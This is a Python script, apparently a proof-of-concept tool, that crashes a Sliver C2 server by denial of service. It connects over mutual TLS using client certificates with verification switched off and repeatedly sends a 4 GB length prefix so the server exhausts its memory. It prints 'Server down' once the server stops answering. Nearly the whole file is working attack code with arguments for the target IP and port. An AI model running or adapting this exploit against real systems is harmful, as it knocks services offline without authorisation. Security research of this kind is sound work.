#!/usr/bin/python
import socket, ssl
import struct
import argparse
from rich import print

ssl_ctx = ssl.create_default_context()
ssl_ctx.load_cert_chain(keyfile='certs/client.key',certfile='certs/client.crt')#,ca_certs='sliver/ca.crt')
ssl_ctx.load_verify_locations('certs/ca.crt')
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

description = '''
Crash a Sliver C2 server. This script sends packets with a large (4G) buffer in the data length value. 
This causes the server to allocate very large buffers until it runs out of memory. Requires an mtls certificate.
'''

def cmdline_args():
  p = argparse.ArgumentParser(prog='CrashSliverServer', description=description,
      formatter_class=argparse.RawDescriptionHelpFormatter)
  
  p.add_argument("ip", type=str,
                 help="The target C2 server IP.")
  p.add_argument("port", type=int,
                 help="The target C2 server port.")
  return(p.parse_args())

crash_codes = [10054,10061,104,111]
successful = False
crashed = False

if __name__ == '__main__':
  args = cmdline_args()

  print('[yellow]\[i][/yellow] DoSing Sliver')

  while True:
    try:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        with ssl_ctx.wrap_socket(s,) as ssock:
          ssock.connect((args.ip,args.port))
          sz = struct.pack('I',4294967295)
          ssock.write(sz)
          print('[cyan]\[i][/cyan] Payload sent successfully')
          successful = True
          crashed = False
    except Exception as e:
      if e.args[0] in crash_codes and successful and not crashed:
        print('[green]\[+][/green] Server down')
        successful=True
        crashed=True
      elif e.args[0] not in crash_codes and not successful:
        print(e)
      